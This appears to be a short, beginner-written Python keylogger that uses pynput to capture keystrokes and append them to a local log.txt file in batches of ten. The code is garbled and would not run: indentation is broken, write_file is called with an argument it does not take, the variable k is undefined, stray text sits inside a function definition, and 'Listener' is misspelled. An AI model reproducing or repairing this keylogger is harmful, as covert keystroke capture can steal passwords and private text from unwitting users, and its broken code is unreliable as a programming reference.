import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
global keys, count

keys.append(key)
count += 1
print("{0} pressed".format(key))

if count >= 10:
    count = 0
    write_file(keys)
    keys = []
    

def write_file():
    with open("log.txt", "a") as f:
        for key in keys:
        f.write (key).replace("'", "")
        if k.find("space")  > 0:
          f.write('\n')
        elif k.find("Key") == -1:
          f.write(k)


def on_release(key): (write some letters)
  if key == Key.esc:
    return False 



with Liastener (on_press=on_press, on_release)  as listener:
  listener.join()
